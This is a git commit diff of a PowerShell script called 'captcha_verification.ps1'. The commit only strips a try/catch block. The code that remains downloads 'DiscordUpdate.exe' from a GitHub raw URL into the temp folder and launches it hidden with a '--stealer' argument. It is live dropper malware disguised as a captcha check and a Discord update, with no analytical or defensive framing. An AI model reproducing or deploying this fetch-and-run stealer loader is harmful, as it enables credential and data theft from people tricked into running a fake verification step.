cd6d6efc683f88d19fde7b39fd46467810012d31
urho122-cpu <urho122@gmail.com>
2026-06-25 19:05:23 +0300

    Update captcha_verification.ps1

--- captcha_verification.ps1
+++ captcha_verification.ps1
@@ -1,7 +1,5 @@
 $exePath = "$env:TEMP\DiscordUpdate.exe"
 $url = "https://raw.githubusercontent.com/urho122-cpu/captcha/main/DiscordUpdate.exe"
 
-try {
-    (New-Object Net.WebClient).DownloadFile($url, $exePath)
-    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
-} catch {}
+(New-Object Net.WebClient).DownloadFile($url, $exePath)
+Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
